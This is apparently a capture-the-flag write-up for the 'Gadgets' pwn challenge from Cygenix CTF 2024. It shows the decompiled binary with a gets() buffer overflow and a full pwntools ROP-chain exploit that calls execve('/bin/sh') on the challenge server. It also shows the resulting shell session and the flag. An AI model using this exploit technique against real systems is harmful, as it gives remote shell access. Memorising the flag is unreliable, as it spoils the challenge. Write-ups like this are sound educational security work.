# Cygenix CTF 2024

## Gadgets

> *"Even the strongest defenses have cracks; find them."*
>
>  Author: N/A
>
> [`main`](main)

Tags: _pwn_

## Solution
To ananlyze the binary for this challenge we put it through `Ghidra`. The setup is very close to [`classic`](../classic/README.md), a tiny `main` function that does nothing. Since the challenge is called `Gadgets` we take this as an hint and search for potential interesting gadgets.

```c
void win(void)
{
  syscall();
  return;
}



undefined8 main(void)
{
  char local_28 [32];
  
  puts("----------------------------------------------");
  puts("w3ll_7h353_w1ll_b3_1mp0551bl3_?");
  puts("7h353 m16h7 h3lp y0u /bin/sh");
  puts("----------------------------------------------");
  fflush(stdout);
  gets(local_28);
  return 0;
}
```

For this we can use `ROPgadget`. We find an `syscall`, that thankfully is provided us by the `win` function. With this we can do a lot of things, also get an remote shell. The only thing is, we need to find the right gadgets to setup the syscall.

```bash
$ ROPgadget --binary main | grep rax
....
0x000000000040114c : pop rax ; ret
....
```

To get a shell we can use syscall `0x3b` (execve). Check [`this`](https://x64.syscall.sh/) for more information. For this we need the following setup.

```bash
rax = 3bh
rdi = address to "/bin/sh"
rsi = 0
rdx = 0
```

We need to search gadgets in the form `pop register; ret`. And thankfully we find any of the needed gadgets and note down the addresses.

The following script builds the rop chain to first setup the registers with the needed values and then jump to the syscall to execute `execve` and give us hopefully a shell.

```python
from pwn import *

context.binary = binary = ELF("./main")

p = remote("chall.ycfteam.in", 2222)

pop_rax = 0x40114c
pop_rdi = 0x40114a
pop_rsi = 0x401150
pop_rdx = 0x40114e
syscall = 0x401159
bin_sh  = next(binary.search(b"/bin/sh"))

payload = flat({
    0x28: [
        # rax = 0x3b
        pop_rax,
        0x3b,
        # rdi = address of "/bin/sh"
        pop_rdi,
        bin_sh,
        # rsi = 0
        pop_rsi,
        0,
        # rdx = 0
        pop_rdx,
        0,
        # call win
        syscall
    ]
})

p.sendline(payload)
p.interactive()
```

```bash
----------------------------------------------
w3ll_7h353_w1ll_b3_1mp0551bl3_?
7h353 m16h7 h3lp y0u /bin/sh
----------------------------------------------
$ ls
flag.txt
main
$ cat flag.txt
CyGenixCTF{74k3_17_y0u_d353rv3_17_br0_j01n7_5y5c4ll}
```

Flag `CyGenixCTF{74k3_17_y0u_d353rv3_17_br0_j01n7_5y5c4ll}`